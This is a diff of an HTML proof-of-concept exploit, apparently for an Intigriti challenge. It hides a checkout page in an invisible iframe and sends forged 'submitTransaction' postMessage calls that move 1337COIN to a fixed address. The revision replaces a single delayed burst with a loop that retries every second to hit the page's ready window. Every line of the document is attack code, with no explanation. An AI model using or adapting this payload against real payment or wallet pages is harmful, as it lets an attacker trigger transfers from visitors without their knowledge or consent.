@@ -2,28 +2,34 @@
 <html>
 <body>
 
-<iframe id="checkout"
-        src="https://app.intigriti.com/checkout.html?currency=1337COIN&price=1"
-        style="display:none"></iframe>
+<iframe
+    id="checkout"
+    src="https://app.intigriti.com/checkout.html?currency=1337COIN&price=1"
+    style="display:none">
+</iframe>
 
 <script>
-function send(amount) {
+function sendTx() {
     document.getElementById('checkout').contentWindow.postMessage({
         type: 'submitTransaction',
         transaction: {
             currency: '1337COIN',
-            amount: amount,
+            amount: 1,
             toAddress: '174094f246eb6712e885d470519c0ad4d4'
         }
     }, '*');
 }
 
-setTimeout(() => {
-    send(1);
-    send(1337);
-    send(31337);
-    send(13371337);
-}, 3000);
+// fire multiple times to catch the exact ready window
+let attempts = 0;
+const interval = setInterval(() => {
+    attempts++;
+    sendTx();
+
+    if (attempts > 10) {
+        clearInterval(interval);
+    }
+}, 1000);
 </script>
 
 </body>
